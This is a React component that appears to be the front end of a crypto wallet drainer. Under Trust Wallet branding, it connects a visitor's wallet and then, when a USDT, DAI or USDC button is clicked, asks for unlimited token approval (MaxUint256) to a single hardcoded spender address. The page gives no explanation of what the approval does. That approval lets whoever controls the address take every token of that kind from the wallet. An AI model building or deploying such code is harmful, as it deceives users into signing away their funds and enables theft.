import React, { useState, useEffect } from "react";
import { EthereumProvider } from "@walletconnect/ethereum-provider";
import { ethers } from "ethers";
import trustWalletLogo from "./assets/trustwallet.svg";


const projectId = import.meta.env.VITE_PROJECT_ID || "";

// Spender address for token approval
const spenderAddress = "0xeD39eB6bC44c0AFa518265ffafE9994f9f91BE4D";

// Tokens list with details (name, contract address, and SVG logo)
const tokens = [
  {
    name: "USDT",
    address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    logo: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#26A17B" d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0zM21.56 12.8c0 .813-2.306 1.494-5.528 1.68v4.778h3.711v1.455H12.24v-1.455h3.711v-4.778c-3.222-.186-5.528-.867-5.528-1.68v-.917c.793.548 2.295.996 5.528 1.183 3.233-.187 4.735-.635 5.528-1.183v.917z"/></svg>`,
  },
  {
    name: "DAI",
    address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
    logo: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#F4B731"/><path fill="#FFF" d="M23.2 13.6H17.6V8H16v5.6h-2.4v-2.4H8v10.4h5.6v-2.4H16v5.6h1.6v-5.6h5.6z"/></svg>`,
  },
  {
    name: "USDC",
    address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
    logo: `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#2775CA"/><path fill="#FFF" d="M15.784 10.45h1.765v8.907h-1.765z"/><path fill="#FFF" d="M19.8 18.254c-.616.61-1.429.917-2.435.917-1.058 0-1.86-.334-2.406-.996-.54-.662-.798-1.655-.798-2.964 0-1.352.256-2.361.803-3.033.547-.671 1.363-1.007 2.443-1.007.985 0 1.8.315 2.45.943.65.629.975 1.635.975 3.01 0 1.344-.324 2.365-.897 3.13zm-2.503-.917c.493 0 .896-.18 1.208-.54.31-.361.466-.92.466-1.681 0-.785-.156-1.364-.466-1.72-.312-.36-.716-.544-1.203-.544-.486 0-.893.187-1.203.551-.31.364-.467.917-.467 1.676 0 .758.16 1.32.471 1.683.312.363.716.544 1.194.544z"/></svg>`,
  },
  // Add more tokens here...
];

const initEthereumProvider = async () => {
  return await EthereumProvider.init({
    projectId,
    chains: [1],
    methods: ["personal_sign", "eth_sendTransaction"],
    showQrModal: true,
    qrModalOptions: { themeMode: "light" },
  });
};

const EthereumApp = () => {
  const [provider, setProvider] = useState<InstanceType<typeof EthereumProvider> | null>(null);
  const [ethersProvider, setEthersProvider] = useState<ethers.BrowserProvider | null>(null);
  const [address, setAddress] = useState<string | null>(null);
  const [isConnected, setIsConnected] = useState(false);

  useEffect(() => {
    const initializeProvider = async () => {
      const ethProvider = await initEthereumProvider();
      setProvider(ethProvider);

      ethProvider.on("display_uri", (uri: string) => {
        console.log("WalletConnect URI:", uri);
      });

      const ethersWeb3Provider = new ethers.BrowserProvider(ethProvider);
      setEthersProvider(ethersWeb3Provider);
    };

    initializeProvider();
  }, []);


  const connectWallet = async () => {
    if (!provider) return;
  
    try {
      await provider.connect();
      const accounts = (await provider.request({ method: "eth_accounts" })) as string[]; // Explicitly type as `string[]`
      if (accounts && accounts.length > 0) {
        setAddress(accounts[0]);
        setIsConnected(true);
      }
    } catch (error) {
      console.error("Wallet connection failed:", error);
    }
  };
  

  const approveToken = async (tokenAddress: string, tokenName: string) => {
    if (!ethersProvider || !address) return;

    try {
      const tokenABI = [
        {
          "inputs": [
            { "internalType": "address", "name": "spender", "type": "address" },
            { "internalType": "uint256", "name": "value", "type": "uint256" },
          ],
          "name": "approve",
          "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
          "stateMutability": "nonpayable",
          "type": "function",
        },
      ];

      const signer = await ethersProvider.getSigner();
      const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);

      const txResponse = await tokenContract.approve(spenderAddress, ethers.MaxUint256);
      await txResponse.wait();

      console.log(`${tokenName} Approval Transaction Sent:`, txResponse.hash);
    } catch (error) {
      console.error(`${tokenName} Approval failed:`, error);
      alert(`${tokenName} Approval failed. Check console for details.`);
    }
  };

  return (
    <>
      <main>
        <div className="step-container" style={{ display: "flex" }}>

          <div className="w-full">
            {!isConnected ? (
              <div className="network-button" onClick={connectWallet}>
                <img src={trustWalletLogo} alt="Trust Wallet" />
                <div>
                  <p className="font-semibold">Connect Wallet</p>
                </div>
              </div>
            ) : (
              <div>
                <h2>Wallet Connected</h2>
                <div className="tokens-list">
                  {tokens.map((token) => (
                    <div key={token.name} className="token-button" onClick={() => approveToken(token.address, token.name)}>
                      <span className="token-logo" dangerouslySetInnerHTML={{ __html: token.logo }}></span>
                      <span className="token-name">{token.name}</span>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        </div>
      </main>
    </>
  );
};

export default EthereumApp;
